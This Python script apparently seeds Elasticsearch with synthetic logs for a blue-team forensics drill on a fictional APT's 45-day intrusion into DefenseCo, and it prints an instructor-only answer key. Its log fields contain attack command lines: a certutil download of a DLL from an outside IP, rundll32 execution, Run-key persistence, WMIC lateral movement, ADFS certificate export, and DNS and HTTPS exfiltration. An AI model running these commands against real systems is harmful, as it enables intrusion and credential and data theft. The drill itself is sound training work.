#!/usr/bin/env python3
"""
Drill 01 Advanced — SILVERLEAF APT Scenario Data Loader
Loads 45 days of log data for a nation-state APT investigation.

Organization: DefenseCo (defenceco.local)
Threat actor: SILVERLEAF (suspected nation-state)
Goal: Exfiltrate REDSTONE_Phase2_Architecture.pdf (classified project document)

Timeline:
  Day -45: Spear-phishing campaign begins
  Day -43: k.ortiz opens weaponized PDF → initial compromise
  Day -40: DNS C2 established (telemetry-exfil.io)
  Day -35: LOLBin execution / lateral movement
  Day -28: Kerberoasting - svc_azure credential
  Day -21: ADFS certificate extraction
  Day -15: REDSTONE document accessed
  Day -10: Staged data exfiltration via DNS tunneling
  Day -3:  HTTPS C2 exfiltration of REDSTONE PDF
  Day 0:   External tip-off received
"""

import time
import os
import requests
import random
import string

ES_HOST = os.environ.get("ES_HOST", "http://elasticsearch:9200")
ES_USER = os.environ.get("ES_USER", "elastic")
ES_PASS = os.environ.get("ES_PASS", "changeme")

# Investigation date: 2024-12-10 00:00 UTC = 1733788800
# Day 0 = day tip-off received
DAY0 = 1733788800
DAY = 86400


def d(days_before, hour=10, minute=0, second=0):
    """Return timestamp for N days before the tip-off date."""
    return DAY0 - days_before * DAY + hour * 3600 + minute * 60 + second


def rnd_subdomain(length=8):
    """Generate a random-looking subdomain (simulating DNS C2 data encoding)."""
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))


def post(index, host, timestamp, event):
    try:
        r = requests.post(
            f"{ES_HOST}/{index}/_doc",
            json={"@timestamp": timestamp, "host": host, **event},
            auth=(ES_USER, ES_PASS),
            headers={"Content-Type": "application/json"},
            timeout=10
        )
        return r.status_code in (200, 201)
    except Exception as e:
        print(f"  Error: {e}", flush=True)
        return False


def wait_for_es():
    print("Waiting for Elasticsearch...", flush=True)
    for _ in range(40):
        try:
            r = requests.get(f"{ES_HOST}/_cluster/health",
                             auth=(ES_USER, ES_PASS), timeout=5)
            if r.status_code == 200:
                print("Elasticsearch ready.", flush=True)
                return True
        except Exception:
            pass
        time.sleep(5)
    return False


def load_events(events):
    success = 0
    for i, (index, host, timestamp, event) in enumerate(events):
        if post(index, host, timestamp, event):
            success += 1
        if (i + 1) % 100 == 0:
            print(f"  Progress: {i+1}/{len(events)}", flush=True)
    return success


def build_events():
    events = []

    # ── Background: legitimate daily activity (45 days of normal logs) ─────
    normal_users = ["j.henderson", "k.ortiz", "a.wright", "svc_azure",
                    "l.morris", "r.chan", "b.taylor"]
    for day in range(45, 0, -1):
        for user in normal_users:
            # Normal logon
            events.append(("winlogs", "CORP-WS-01", d(day, 8, random.randint(0, 30)),
                {"sourcetype": "xmlwineventlog:security",
                 "EventCode": 4624, "Account_Name": user,
                 "Logon_Type": 2, "Source_Network_Address": "::1"}))
            # Normal DNS queries
            for domain in ["microsoft.com", "office365.com", "google.com", "defenceco.local"]:
                events.append(("dns", f"CORP-WS-{random.randint(1,20):02d}",
                    d(day, random.randint(8, 18), random.randint(0, 59)),
                    {"sourcetype": "dns", "src_ip": f"10.0.{random.randint(1,5)}.{random.randint(10,200)}",
                     "query": domain, "query_type": "A", "response_code": "NOERROR"}))

    # ── Day -45: Spear-phishing emails ──────────────────────────────────────
    for recipient, ts_offset in [("k.ortiz", 0), ("j.henderson", 1800), ("a.wright", 7200)]:
        events.append(("email", "MAIL01", d(45, 9) + ts_offset,
            {"sourcetype": "mail:smtp",
             "to_address": f"{recipient}@defenceco.local",
             "from_address": "research-papers@aerospace-journal-notifications.com",
             "subject": "New Paper: Advanced Composite Materials in Defense Systems",
             "sender_ip": "91.121.87.33",
             "attachment_name": "aerospace_composites_2024.pdf",
             "attachment_hash_sha256": "aef3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3",
             "spf_result": "FAIL", "dkim_result": "FAIL",
             "action": "DELIVERED"}))

    # ── Day -43: k.ortiz opens the PDF → exploit → initial compromise ───────
    events.append(("sysmon", "ENG-WS-K-ORTIZ", d(43, 10, 14),
        {"sourcetype": "xmlwineventlog:microsoft-windows-sysmon/operational",
         "EventID": 1, "Computer": "ENG-WS-K-ORTIZ", "User": "DEFCO\\k.ortiz",
         "Image": "C:\\Program Files\\Adobe\\Acrobat DC\\Acrobat\\Acrobat.exe",
         "CommandLine": "Acrobat.exe aerospace_composites_2024.pdf",
         "ParentImage": "C:\\Windows\\explorer.exe"}))

    # PDF exploit triggers certutil LOLBin
    events.append(("sysmon", "ENG-WS-K-ORTIZ", d(43, 10, 16),
        {"sourcetype": "xmlwineventlog:microsoft-windows-sysmon/operational",
         "EventID": 1, "Computer": "ENG-WS-K-ORTIZ", "User": "DEFCO\\k.ortiz",
         "Image": "C:\\Windows\\System32\\certutil.exe",
         "CommandLine": "certutil.exe -urlcache -split -f http://91.121.87.33/upd/cert.crt C:\\ProgramData\\Fonts\\svcfont.dll",
         "ParentImage": "C:\\Program Files\\Adobe\\Acrobat DC\\Acrobat\\Acrobat.exe"}))

    # Implant loaded
    events.append(("sysmon", "ENG-WS-K-ORTIZ", d(43, 10, 17),
        {"sourcetype": "xmlwineventlog:microsoft-windows-sysmon/operational",
         "EventID": 1, "Computer": "ENG-WS-K-ORTIZ", "User": "DEFCO\\k.ortiz",
         "Image": "C:\\Windows\\System32\\rundll32.exe",
         "CommandLine": "rundll32.exe C:\\ProgramData\\Fonts\\svcfont.dll,Init",
         "ParentImage": "C:\\Windows\\System32\\certutil.exe"}))

    # Persistence: registry Run key
    events.append(("sysmon", "ENG-WS-K-ORTIZ", d(43, 10, 18),
        {"sourcetype": "xmlwineventlog:microsoft-windows-sysmon/operational",
         "EventID": 13, "Computer": "ENG-WS-K-ORTIZ", "User": "DEFCO\\k.ortiz",
         "TargetObject": "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\FontCache",
         "Details": "C:\\Windows\\System32\\rundll32.exe C:\\ProgramData\\Fonts\\svcfont.dll,Init"}))

    # ── Day -40: DNS C2 establishes regular beaconing ───────────────────────
    for day in range(40, 0, -1):
        for i in range(30):  # ~30 DNS C2 queries per day
            sub = rnd_subdomain(12)
            events.append(("dns", "ENG-WS-K-ORTIZ", d(day, random.randint(8, 20), random.randint(0, 59)),
                {"sourcetype": "dns",
                 "src_ip": "10.0.2.45",
                 "query": f"{sub}.telemetry-exfil.io",
                 "query_type": "TXT",
                 "response_code": "NOERROR",
                 "response_data": "aGVsbG8="}))  # base64 C2 response

    # ── Day -35: Lateral movement to CTO workstation ─────────────────────────
    events.append(("sysmon", "CTO-WS-J-HENDERSON", d(35, 14, 22),
        {"sourcetype": "xmlwineventlog:microsoft-windows-sysmon/operational",
         "EventID": 1, "Computer": "CTO-WS-J-HENDERSON",
         "User": "DEFCO\\k.ortiz",
         "Image": "C:\\Windows\\System32\\wmic.exe",
         "CommandLine": "wmic /node:CTO-WS-J-HENDERSON process call create \"rundll32.exe C:\\ProgramData\\Fonts\\svcfont.dll,Init\"",
         "ParentImage": "C:\\Windows\\System32\\cmd.exe"}))

    events.append(("winlogs", "CTO-WS-J-HENDERSON", d(35, 14, 25),
        {"sourcetype": "xmlwineventlog:security",
         "EventCode": 4624, "ComputerName": "CTO-WS-J-HENDERSON",
         "Account_Name": "k.ortiz", "Logon_Type": 3,
         "Source_Network_Address": "10.0.2.45"}))

    # ── Day -28: Kerberoasting ────────────────────────────────────────────────
    events.append(("winlogs", "DC01", d(28, 11, 5),
        {"sourcetype": "xmlwineventlog:security",
         "EventCode": 4769, "ComputerName": "DC01",
         "Account_Name": "k.ortiz@DEFENCECO.LOCAL",
         "Service_Name": "svc_azure",
         "Ticket_Encryption_Type": "0x17",
         "Client_Address": "10.0.2.45"}))

    # ── Day -21: ADFS certificate extraction ──────────────────────────────────
    events.append(("sysmon", "ADFS-SRV01", d(21, 3, 44),
        {"sourcetype": "xmlwineventlog:microsoft-windows-sysmon/operational",
         "EventID": 1, "Computer": "ADFS-SRV01",
         "User": "DEFCO\\svc_azure",
         "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
         "CommandLine": "powershell.exe -NonInteractive Get-ADFSProperties; Export-AADIntADFSCertificates -Path C:\\Windows\\Temp\\adfs_certs.pfx",
         "ParentImage": "C:\\Windows\\System32\\cmd.exe"}))

    events.append(("winlogs", "ADFS-SRV01", d(21, 3, 45),
        {"sourcetype": "xmlwineventlog:microsoft-windows-sysmon/operational",
         "EventID": 1202, "ComputerName": "ADFS-SRV01",
         "Account_Name": "svc_azure",
         "Message": "ADFS federation service token signing certificate was accessed by svc_azure\\\\DEFCO"}))

    # ── Day -15: REDSTONE document accessed ───────────────────────────────────
    events.append(("sysmon", "CTO-WS-J-HENDERSON", d(15, 16, 12),
        {"sourcetype": "xmlwineventlog:microsoft-windows-sysmon/operational",
         "EventID": 11, "Computer": "CTO-WS-J-HENDERSON",
         "User": "DEFCO\\j.henderson",
         "Image": "C:\\Program Files\\Adobe\\Acrobat DC\\Acrobat\\Acrobat.exe",
         "TargetFilename": "C:\\Users\\j.henderson\\Documents\\PROJECTS\\REDSTONE_Phase2_Architecture.pdf"}))

    events.append(("winlogs", "FILE-SRV01", d(15, 16, 14),
        {"sourcetype": "xmlwineventlog:security",
         "EventCode": 4663, "ComputerName": "FILE-SRV01",
         "Account_Name": "k.ortiz",
         "Object_Name": "\\\\FILE-SRV01\\Projects\\REDSTONE\\REDSTONE_Phase2_Architecture.pdf",
         "Access_Mask": "0x1"}))

    # ── Day -10 to -3: DNS data exfiltration (encoded file data) ─────────────
    for day in range(10, 3, -1):
        for i in range(120):  # heavy DNS tunneling
            sub = rnd_subdomain(20)  # longer subdomains = more data
            events.append(("dns", "ENG-WS-K-ORTIZ", d(day, random.randint(2, 5), random.randint(0, 59)),
                {"sourcetype": "dns",
                 "src_ip": "10.0.2.45",
                 "query": f"{sub}.telemetry-exfil.io",
                 "query_type": "TXT",
                 "response_code": "NOERROR",
                 "response_data": "Y2QgL3RtcC8gJiYgbHMgLWxh"}))

    # ── Day -3: HTTPS exfiltration of REDSTONE PDF ────────────────────────────
    events.append(("proxy", "ENG-WS-K-ORTIZ", d(3, 3, 18),
        {"sourcetype": "proxy:squid",
         "user": "k.ortiz", "src_ip": "10.0.2.45",
         "dest_ip": "91.121.87.33", "dest_port": 443,
         "uri": "https://cdn-update-pkg.com/api/telemetry/upload",
         "http_method": "POST",
         "bytes_out": 4718592,  # ~4.5 MB = REDSTONE PDF
         "bytes_in": 512,
         "user_agent": "Microsoft-WNS/10.0"}))

    events.append(("firewall", "FW01", d(3, 3, 18),
        {"sourcetype": "firewall:paloalto",
         "src_ip": "10.0.2.45", "src_port": 55443,
         "dest_ip": "91.121.87.33", "dest_port": 443,
         "protocol": "tcp", "action": "allow",
         "bytes_out": 4718592, "bytes_in": 512,
         "application": "ssl"}))

    return events


def main():
    if not wait_for_es():
        print("ERROR: Elasticsearch not available.")
        return

    events = build_events()
    print(f"Loading {len(events)} events (45-day APT timeline)...", flush=True)
    success = load_events(events)
    print(f"\nLoaded {success}/{len(events)} events.")
    print("\nScenario: SILVERLEAF APT - DefenseCo Investigation")
    print("Access Kibana at http://localhost:5603 (elastic/changeme)")
    print("\nKEY FINDINGS (INSTRUCTOR ONLY):")
    print("  First phishing:     Day -45 (aerospace-journal-notifications.com)")
    print("  Initial compromise: Day -43 (k.ortiz, certutil LOLBin)")
    print("  C2 domain:          telemetry-exfil.io (DNS TXT tunneling)")
    print("  Lateral movement:   Day -35 (WS-K-ORTIZ → CTO-WS)")
    print("  Kerberoasting:      Day -28 (svc_azure cracked)")
    print("  ADFS cert stolen:   Day -21 (Golden SAML possible)")
    print("  Target document:    REDSTONE_Phase2_Architecture.pdf")
    print("  Exfil path:         DNS tunneling + HTTPS to 91.121.87.33")
    print("  Dwell time:         45 days undetected")

    while True:
        time.sleep(3600)


if __name__ == "__main__":
    main()
